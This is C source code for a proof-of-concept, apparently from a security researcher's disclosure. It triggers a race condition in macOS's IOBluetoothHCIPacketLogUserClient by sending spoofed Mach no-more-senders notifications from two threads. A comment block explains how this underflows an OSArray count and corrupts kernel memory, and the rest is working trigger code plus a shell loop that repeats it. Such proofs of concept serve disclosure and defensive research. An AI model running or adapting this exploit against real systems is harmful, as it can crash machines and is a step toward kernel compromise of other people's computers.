// ianbeer
// clang -o iospoof_bluepacketlog iospoof_bluepacketlog.c -framework IOKit
// boot-args debug=0x144 -v pmuflags=1 kdp_match_name=en3 gzalloc_min=100 gzalloc_max=300 -no-zp

/*
Spoofed no-more-senders notifications with IOBluetoothHCIPacketLogUserClient leads to unsafe parallel OSArray manipulation

The OS* data types (OSArray etc) are explicity not thread safe; they rely on their callers to implement the required locking
to serialize all accesses and manipulations of them. By sending two spoofed no-more-senders notifications on two threads at the
same time we can cause parallel calls to OSArray::removeObject with no locks which is unsafe. In this particular case you might see two threads
both passing the index >= count check in OSArray::removeObject (when count = 1 and index = 0) but then both decrementing count leading to an OSArray with
a count of 0xffffffff leading to memory corruption when trying to shift the array contents.

repro: while true; do ./iospoof_bluepacketlog; done
*/ 

#include <stdio.h>
#include <stdlib.h>

#include <mach/mach.h>
#include <mach/thread_act.h>

#include <pthread.h>
#include <unistd.h>

#include <IOKit/IOKitLib.h>

io_connect_t conn = MACH_PORT_NULL;

int start = 0;

struct spoofed_notification {
  mach_msg_header_t header;
  NDR_record_t NDR;
  mach_msg_type_number_t no_senders_count;
};

struct spoofed_notification msg = {0};

void send_message() {
  mach_msg(&msg,
           MACH_SEND_MSG,
           msg.header.msgh_size,
           0,
           MACH_PORT_NULL,
           MACH_MSG_TIMEOUT_NONE,
           MACH_PORT_NULL);
}

void go(void* arg){

  while(start == 0){;}

  usleep(1);

  send_message();
}

int main(int argc, char** argv) {
  char* service_name = "IOBluetoothHCIController";
  int client_type = 1;

  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(service_name));
  if (service == MACH_PORT_NULL) {
    printf("can't find service\n");
    return 0;
  }

  IOServiceOpen(service, mach_task_self(), client_type, &conn);
  if (conn == MACH_PORT_NULL) {
    printf("can't connect to service\n");
    return 0;
  }

  pthread_t t;
  int arg = 0;
  pthread_create(&t, NULL, (void*) go, (void*) &arg);

  // build the message:
  msg.header.msgh_size = sizeof(struct spoofed_notification);
  msg.header.msgh_local_port = conn;
  msg.header.msgh_remote_port = conn;
  msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND);
  msg.header.msgh_id = 0106;
  
  msg.no_senders_count = 1000;

  usleep(100000);

  start = 1;

  send_message();

  pthread_join(t, NULL);

  return 0;
}
